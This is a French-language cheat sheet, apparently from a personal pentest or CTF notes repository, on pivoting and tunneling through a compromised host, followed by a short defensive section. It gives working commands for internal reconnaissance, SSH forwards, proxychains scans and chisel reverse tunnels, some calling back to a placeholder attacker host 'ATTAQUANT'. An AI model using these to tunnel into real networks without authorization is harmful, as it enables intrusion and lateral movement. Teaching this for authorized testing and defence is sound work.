# Pivoting & tunneling

Une fois un hôte compromis, il se trouve souvent entre toi et un réseau que tu
ne peux pas atteindre directement. Le pivoting, c'est utiliser ce point d'appui
comme relais pour atteindre le segment caché ; le tunneling, c'est la plomberie
qui y fait passer ton trafic. Le schéma est toujours le même : trouver le second
réseau, puis router tes outils à travers la machine compromise.

Tous les exemples sont génériques. Rien ici n'est la solution d'un challenge précis.

## 1. Voir ce que voit le point d'appui

Sur l'hôte compromis, cartographie ses autres interfaces et voisins :

```
ip a ; ip route            # interfaces et routes
arp -a                     # hôtes avec qui il a parlé
cat /etc/hosts
ss -tnp                    # connexions établies -> services internes
```

Une seconde interface comme `172.16.5.10/24` sur un hôte atteint via
`10.10.10.5` signifie tout un `172.16.5.0/24` que tu vises maintenant *à travers*
lui.

## 2. Forward d'un seul port (tu veux un service)

**SSH local forward** — ramène un port interne sur ta machine :

```
ssh -L 8080:172.16.5.20:80 user@10.10.10.5
# puis ouvre http://127.0.0.1:8080  -> atteint l'appli web interne
```

**SSH remote forward** — quand le pivot peut t'atteindre mais pas l'inverse
(pousse un service vers ta machine) :

```
ssh -R 9001:127.0.0.1:9001 user@ATTAQUANT
```

## 3. Accès à tout le sous-réseau (proxy SOCKS)

Quand tu veux que *tous* tes outils atteignent le réseau interne, ouvre un proxy
SOCKS dynamique au lieu de forwarder les ports un par un :

```
ssh -D 1080 user@10.10.10.5           # SOCKS5 sur le :1080 local
```

Pointe tes outils dessus avec **proxychains** (`socks5 127.0.0.1 1080` dans
`proxychains.conf`) :

```
proxychains nmap -sT -Pn 172.16.5.20
proxychains curl http://172.16.5.20
```

Utilise des scans TCP connect (`-sT -Pn`) à travers un proxy — les scans SYN ne
passent pas dans le tunnel.

## 4. Pas de SSH sur la machine ? Un outil relais

Dépose un petit binaire de pivot et reconnecte-toi. **chisel** est le choix
courant :

```
# attaquant (serveur)
./chisel server -p 8000 --reverse
# victime (client) -> expose un proxy SOCKS sur le :1080 de l'attaquant
./chisel client ATTAQUANT:8000 R:1080:socks
```

Puis proxychains via `127.0.0.1:1080` comme ci-dessus. `ligolo-ng` est une
alternative plus propre qui te donne une vraie interface routée au lieu de
proxychains.

## 5. Chaînage (double pivot)

Les réseaux plus profonds demandent une chaîne : l'hôte A atteint B, B atteint
C. Empile les tunnels — un proxy SOCKS sur A, un second relais démarré *à
travers* ce proxy sur B. Garde une carte de quel port local arrive sur quel
réseau pour ne pas t'y perdre.

## 6. Se défendre

- **Segmente** et firewall le trafic est-ouest ; un serveur web n'a aucune
  raison d'ouvrir des sessions SSH/SMB vers le VLAN serveurs.
- **Filtre l'egress** sortant — les tunnels inverses dépendent de la victime qui
  compose vers l'extérieur sur des ports arbitraires ; n'autorise que le
  nécessaire.
- Alerte sur un hôte qui fait des connexions inhabituelles pour son rôle (un
  hôte BDD qui initie du SSH sortant, des connexions longues vers beaucoup
  d'hôtes internes).
- Moindre privilège et identifiants à durée de vie courte pour qu'un seul point
  d'appui n'ouvre pas tout le reste.

---

Fait par **White** · [github.com/white-exee](https://github.com/white-exee)
